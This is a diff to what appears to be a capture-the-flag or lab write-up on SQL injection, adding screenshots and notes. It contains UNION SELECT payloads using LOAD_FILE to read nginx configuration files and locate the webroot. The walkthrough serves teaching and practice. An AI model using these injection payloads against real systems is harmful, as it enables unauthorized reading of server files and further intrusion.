@@ -115,14 +115,22 @@ Next, lets see what permissions are avalible with the payload:
 
         ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/nginx.conf"),4-- -
 
+<img width="1002" height="596" alt="conf" src="https://github.com/user-attachments/assets/30a27e33-180b-4612-9578-38fdb363ac51" />
 
 - There is a lot in the output, but lets focus on this:
 
+<img width="1002" height="596" alt="conf_path" src="https://github.com/user-attachments/assets/0320c4f7-f678-46a3-8c58-6b41b4a0b507" />
+
+
+  - This tells us where the virtual hosts live
+
   - The * is a placeholder, by knowing how 
  
-    - Now we can read the host file:
+- Now we have what we need to read the host file:
 
-            ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
+        ') UNION SELECT 1,2,LOAD_FILE("/etc/nginx/sites-enabled/default"),4-- -
 
+    <img width="1002" height="583" alt="webroot" src="https://github.com/user-attachments/assets/6e2503c4-21d0-4549-90b7-7c85b48cb49d" />
 
+    - The webroot is: /var/www/chattr-prod
 
